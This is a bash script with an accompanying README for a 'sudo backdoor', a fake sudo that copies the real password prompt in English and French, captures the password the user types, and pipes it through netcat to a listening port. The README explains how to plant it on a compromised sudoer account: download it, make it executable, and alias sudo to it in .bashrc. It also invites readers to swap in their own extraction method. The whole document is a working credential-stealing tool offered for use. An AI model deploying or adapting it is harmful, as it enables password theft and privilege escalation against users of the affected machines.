#/bin/bash

##
##

#Show usage if no options are given
if [ "$#" -eq 0 ];then
	/usr/bin/sudo
	exit 1
elif [ "$1" == "-h" ];then
	/usr/bin/sudo -h
	exit 0
fi

#Check if user has a valid sudo session
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ];then
	#User has a sudo session. Don't ask again
	/usr/bin/sudo $@
	result=$?
	#Exit correctly depending on the result
	exit $result
fi

#Get locale language
LANG=$(locale | grep 'LANG=' | cut -d'=' -f2)

#Set prompt and error messages
#French messages
if [[ $(echo $LANG | grep 'fr') ]];then
	prompt_msg="[sudo] Mot de passe de $(whoami) :"
	fail_msg="Désolé, essayez de nouveau."
	incorrect_msg="saisies de mots de passe incorrectes"
#English messages
#Make english the default language 
else
	prompt_msg="[sudo] password for $(whoami) :"
	fail_msg="Sorry, try again."
	incorrect_msg="incorrect password attempts"
fi

attempts=0

#Show number of incorrect attempts when user hits Ctrl-C
trap ctrl_c INT

function ctrl_c() {
	echo
	if [ "$attempts" -ne 0 ];then
		echo "sudo: "$attempts" "$incorrect_msg
	fi
	exit 1
}

while [ "$attempts" -le 2 ]; do
	echo -n $prompt_msg" "
	read -s passwd
	echo
	attempts=$((attempts+1))
	echo $passwd | /usr/bin/sudo -S true > /dev/null 2>&1
	result=$?
	if [ "$result" -eq 1 ];then
		if [ "$attempts" -eq 3 ];then
			echo "sudo: "$attempts" "$incorrect_msg
			exit 1
		else
			echo $fail_msg
		fi
	elif [ "$result" -eq 0 ];then
		echo $passwd | /usr/bin/sudo -S $@
		break
	fi
done

echo $passwd | nc localhost 31337 &
exit 0

##
##

##
##

# Sudo backdoor
This bash script mimics the original sudo binary behavior to con a user into
typing his password.

The backdoored sudo displays different message based on the locale language used
on the host (english and french for the time being).

The password is sent over the network for the attacker to retrieve.

## Installation
Once you gain access to a user account that you suspect being sudoer, you can
place this backdoored sudo script to gain administrative control over the host.

```
wget https://raw.githubusercontent.com/nisay759/sudo-backdoor/master/sudo.sh -O /somewhere/sudo
chmod +x /somewhere/sudo
```

Modify the script (the line before the last one) to adapt the extraction method
with a one that fits your use-case.

Next, you want the user to call the backdoored sudo instead of the original one:

```
echo 'alias sudo="/somewhere/sudo"' >> ~/.bashrc
```
for example.

## TODO
- [ ] Add support for other locales

##
##
